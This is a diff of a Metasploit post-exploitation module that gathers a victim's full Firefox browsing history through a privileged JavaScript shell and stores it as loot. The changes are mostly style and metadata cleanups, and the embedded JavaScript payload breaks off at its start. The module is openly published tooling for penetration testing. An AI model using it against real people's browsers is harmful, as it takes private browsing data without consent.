@@ -8,20 +8,28 @@ require 'json'
 class MetasploitModule < Msf::Post
   include Msf::Exploit::Remote::FirefoxPrivilegeEscalation
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'          => 'Firefox Gather History from Privileged Javascript Shell',
-      'Description'   => %q{
-        This module allows collection of the entire browser history from a Firefox
-        Privileged Javascript Shell.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'joev' ],
-      'DisclosureDate' => '2014-04-11'
-    ))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Firefox Gather History from Privileged JavaScript Shell',
+        'Description' => %q{
+          This module allows collection of the entire browser history from a Firefox
+          Privileged JavaScript Shell.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'joev' ],
+        'DisclosureDate' => '2014-04-11',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
+      )
+    )
 
     register_options([
-      OptInt.new('TIMEOUT', [true, "Maximum time (seconds) to wait for a response", 90])
+      OptInt.new('TIMEOUT', [true, 'Maximum time (seconds) to wait for a response', 90])
     ])
   end
 
@@ -31,19 +39,19 @@ class MetasploitModule < Msf::Post
       begin
         history = JSON.parse(results)
         history.each do |entry|
-          entry.keys.each { |k| entry[k] = Rex::Text.decode_base64(entry[k]) }
+          entry.each_key { |k| entry[k] = Rex::Text.decode_base64(entry[k]) }
         end
 
-        file = store_loot("firefox.history.json", "text/json", rhost, history.to_json)
+        file = store_loot('firefox.history.json', 'text/json', rhost, history.to_json)
         print_good("Saved #{history.length} history entries to #{file}")
-      rescue JSON::ParserError => e
+      rescue JSON::ParserError
         print_warning(results)
       end
     end
   end
 
   def js_payload
-    %Q|
+    %|
       (function(send){
         try {
           var service = Components
